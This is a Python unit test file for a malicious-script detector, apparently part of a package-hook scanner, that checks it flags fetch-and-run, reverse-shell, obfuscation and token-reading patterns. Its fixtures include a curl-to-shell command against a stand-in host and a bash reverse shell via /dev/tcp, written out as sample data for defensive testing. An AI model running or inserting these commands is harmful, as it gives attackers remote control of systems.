"""Unit tests for phanos.ast_filter."""

from __future__ import annotations

from phanos.ast_filter import ASTFilter, ASTFilterResult


def test_detects_reverse_shell_command_patterns() -> None:
    analyzer = ASTFilter()
    hook = "curl http://evil.example/payload.sh | sh"
    source = "require('child_process').exec('bash -i >& /dev/tcp/10.0.0.5/4444 0>&1')"

    result = analyzer.analyze(hook, source)

    assert isinstance(result, ASTFilterResult)
    assert result.is_suspicious is True
    assert "risky_binary:curl" in result.matched_triggers
    assert any(trigger.startswith("execution:") for trigger in result.matched_triggers)
    assert "payload.sh" in result.condensed_payload


def test_detects_obfuscated_base64_and_entropy_markers() -> None:
    analyzer = ASTFilter()
    payload = (
        "const blob = 'VGhpcyBpcyBhIHNpbXVsYXRlZCBiYXNlNjQgcGF5bG9hZCB3aXRoIGVub3VnaCBsZW5ndGg=';\n"
        "const qxvotjmf_azklemnqpdwryh = blob.split('').reverse().join('');"
    )

    result = analyzer.analyze("node setup.js", payload)

    assert result.is_suspicious is True
    assert "obfuscation:base64_blob" in result.matched_triggers
    assert "obfuscation:randomized_identifier" in result.matched_triggers
    assert any(trigger.startswith("obfuscation:high_entropy_token") for trigger in result.matched_triggers)


def test_clean_script_is_not_flagged() -> None:
    analyzer = ASTFilter()
    hook = "node scripts/build.js"
    source = "console.log('build complete');\nconst retries = 3;"

    result = analyzer.analyze(hook, source)

    assert result.is_suspicious is False
    assert result.matched_triggers == []
    assert result.condensed_payload == ""


def test_detects_multiline_split_bypass_patterns() -> None:
    analyzer = ASTFilter()
    source = (
        "const cp = require(\n"
        "  'child_process'\n"
        ");\n"
        "const secret = process[\n"
        "  'env'\n"
        "]['TOKEN'];\n"
        "const part1 = 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=';\n"
        "const part2 = 'YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=';\n"
        "const payload = part1 + part2;\n"
        "cp[\n"
        "  'exec'\n"
        "]('node run.js');\n"
    )

    result = analyzer.analyze("node setup.js", source)

    assert result.is_suspicious is True
    assert any(trigger.startswith("execution:") for trigger in result.matched_triggers)
    assert any(trigger.startswith("environment:") for trigger in result.matched_triggers)
    assert "obfuscation:high_entropy_token" in result.matched_triggers
